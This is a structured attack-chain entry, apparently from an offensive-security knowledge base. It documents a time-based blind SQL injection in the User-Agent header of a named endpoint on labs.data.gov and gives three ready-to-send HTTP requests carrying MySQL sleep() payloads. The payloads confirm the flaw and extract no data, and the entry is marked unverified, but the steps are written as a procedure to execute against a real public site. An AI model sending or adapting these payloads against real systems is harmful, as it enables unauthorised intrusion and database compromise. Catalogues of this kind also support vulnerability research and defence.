---
id: 5c1c6e37-353a-47ab-b054-f4600ae93179
name: Time-Based Blind SQL Injection via User-Agent on Data.gov Dashboard
type: attack_chain
description: >-
  Exploitation of a time-based blind SQL injection vulnerability in the
  User-Agent header of the /dashboard/datagov/csv_to_json endpoint on
  labs.data.gov, allowing manipulation of SQL queries without data extraction.
verified: false
submitted: true
step_count: 3
created_at: '2025-12-11T06:10:28.727Z'
updated_at: '2025-12-11T06:10:28.727Z'
procedures:
  - '[[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
tags:
  - sqli
  - time-based
  - blind-sqli
  - web-vuln
platforms:
  - Web
tools: []
commands:
  - '[[commands/sql-injection-sleep-25s-user-agent]]'
  - '[[commands/sql-injection-sleep-0s-user-agent]]'
  - '[[commands/sql-injection-sleep-6s-user-agent]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
---

# Time-Based Blind SQL Injection via User-Agent on Data.gov Dashboard

Multi-stage attack chain demonstrating the discovery and confirmation of a time-based blind SQL injection vulnerability in the User-Agent HTTP header on the labs.data.gov dashboard endpoint. The attack uses sleep functions with arithmetic operations to observe response delays, confirming injection without extracting data. This leads to potential manipulation of SQL queries against the MySQL database, rated as critical severity.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Send 25s Delay Payload] --> B[Send 0s Delay Payload]
    B --> C[Send 6s Delay Payload]
    C --> D[Confirm Vulnerability]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (standard HTTP client like curl or browser tools)

### Target Environment

- Web platform
- MySQL database service
- Access to labs.data.gov over HTTP

### Initial Access Requirements

- Network access to the target endpoint
- No credentials required
- Ability to modify HTTP headers

## Detailed Attack Procedures

### Step 1: Send 25-Second Delay Payload - [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]

**Procedure**: [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]

**Objective**: Inject a time-based SQL payload to cause a 25-second delay and observe the response time to confirm injection.

**Expected Output**: Server responds after approximately 25 seconds.

**Success Indicators**:
- Response delay of 25 seconds
- No error messages, confirming blind injection

Execute the command [[commands/sql-injection-sleep-25s-user-agent]] to send the HTTP GET request with the User-Agent payload containing sleep(5*5):

```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

Validate by timing the response.

### Step 2: Send 0-Second Delay Payload - [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]

**Procedure**: [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]

**Objective**: Inject a payload that results in zero delay to contrast with the previous step and confirm control over the sleep duration.

**Expected Output**: Server responds immediately.

**Success Indicators**:
- Immediate response (no delay)
- Confirms that delay is controllable via payload arithmetic

Execute the command [[commands/sql-injection-sleep-0s-user-agent]] to send the HTTP GET request with the User-Agent payload containing sleep(5*5*0):

```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

Validate by noting the lack of delay.

### Step 3: Send 6-Second Delay Payload - [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]

**Procedure**: [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]

**Objective**: Inject a payload with a different arithmetic operation to cause a 6-second delay, further verifying the vulnerability.

**Expected Output**: Server responds after approximately 6 seconds.

**Success Indicators**:
- Response delay of 6 seconds
- Demonstrates arbitrary control over query execution time

Execute the command [[commands/sql-injection-sleep-6s-user-agent]] to send the HTTP GET request with the User-Agent payload containing sleep(6*6-30):

```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

Validate by timing the response and comparing to previous steps.

## Attack Chain Summary

### Key Achievements

1. Confirmed time-based blind SQL injection in User-Agent header
2. Demonstrated control over SQL query execution time
3. Highlighted potential for query logic manipulation and data compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: [TIMESTAMP]*
